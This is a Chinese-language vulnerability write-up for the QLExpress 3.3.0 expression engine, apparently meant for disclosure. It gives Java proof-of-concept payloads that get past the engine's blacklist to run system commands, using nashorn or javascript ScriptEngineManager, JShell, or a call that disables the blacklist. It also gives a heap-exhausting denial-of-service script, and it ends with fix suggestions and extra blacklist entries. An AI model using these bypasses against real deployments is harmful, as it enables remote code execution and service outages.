# QLExpress-3.3.0-vuln-poc

## 针对1级防御

### RCE

#### POC

针对黑名单的绕过，我总结了下三种无外部依赖的绕过姿势，以下是poc

```java
package vuln;

import com.ql.util.express.DefaultContext;
import com.ql.util.express.ExpressRunner;
import com.ql.util.express.config.QLExpressRunStrategy;

/**
 * 黑名单绕过
 */
public class Test1 {
    public static void main(String[] args) throws Exception {
        // 开启黑名单
        QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true);
        ExpressRunner runner = new ExpressRunner();
        DefaultContext<String, Object> context = new DefaultContext<String, Object>();

//        使用ScriptEngineManager绕过黑名单
//        String payload1_1 = "new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"s=[2];s[0]='open';s[1]='/System/Applications/Calculator.app';java.lang.Runtime.getRuntime().exec(s);\");";
//        String payload1_2 = "new javax.script.ScriptEngineManager().getEngineByName(\"javascript\").eval(\"s=[2];s[0]='open';s[1]='/System/Applications/Calculator.app';java.lang.Runtime.getRuntime().exec(s);\")";


//        Jdk>9时采用jShell绕过
//        String payload2 = "jdk.jshell.JShell.create().eval('java.lang.Runtime.getRuntime().exec(\"open -a calculator.app\")')";

//        利用QLExpressRunStrategy关闭黑名单
        String code = "import com.ql.util.express.config.QLExpressRunStrategy;QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(false);Runtime.getRuntime().exec(\"open -a calculator.app\");";
        runner.execute(code, new DefaultContext<>(), null, false, true);
    }
}

```

![截屏2023-01-28 10.43.05](/Users/zhchen/Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2023-01-28%2010.43.05.png)

#### 修复建议

- 建议加强原本的黑名单

- ```java
  SECURITY_RISK_METHOD_LIST.add(QLExpressRunStrategy.class.getName()+".setForbidInvokeSecurityRiskMethods");
  SECURITY_RISK_METHOD_LIST.add("jdk.jshell.JShell.create");
  SECURITY_RISK_METHOD_LIST.add("javax.script.ScriptEngineManager.getEngineByName");
  SECURITY_RISK_METHOD_LIST.add("org.springframework.jndi.JndiLocatorDelegate.lookup");
  ```

  

---

## 针对2级防御

### DoS

#### POC

在阅读防御措施相关代码后，我发现黑白名单的本质防御其实是对方法(`Method`)的禁用。当用户指定可执行方法的白名单时，确实能有效防御许多代码执行的方法。

但存在下面这种情况，可以造成OutOfMemoryError，导致堆内存泄漏，进而其他应用无法使用堆内存，从而导致DOS，也就是服务不可用(拒绝服务)。

以下是POC

```java
public class Test2 {
    public static void main(String[] args) throws Exception {
      	// 开启白名单，并指定使用特定安全方法
        QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true);
        QLExpressRunStrategy.addSecureMethod(RiskBean.class, "secureMethod");
        ExpressRunner runner = new ExpressRunner();
        DefaultContext<String, Object> context = new DefaultContext<String, Object>();
        String code = "byte[] bytes = new byte[2147483645];for (i=0;i<2147483645;i++) {new String(bytes);}";
        runner.execute(code, new DefaultContext<>(), null, false, true);
    }
}

```

![截屏2023-01-28 12.31.01](/Users/zhchen/Desktop/%E6%88%AA%E5%B1%8F2023-01-28%2012.31.01.png)

#### 修复建议

- 当攻击者使用脚本多次像服务中发送恶意POC时，会导致DoS。这种攻击绕开了黑白名单的方法执行，而是直接申请堆内存空间。
- 对此防御措施应该为当解释代码并执行时遇到OutOfMemoryError错误时应当捕获这个Throwable，并关闭掉runner的excute功能，防止服务中其他服务不可用(造成更大的危害)。

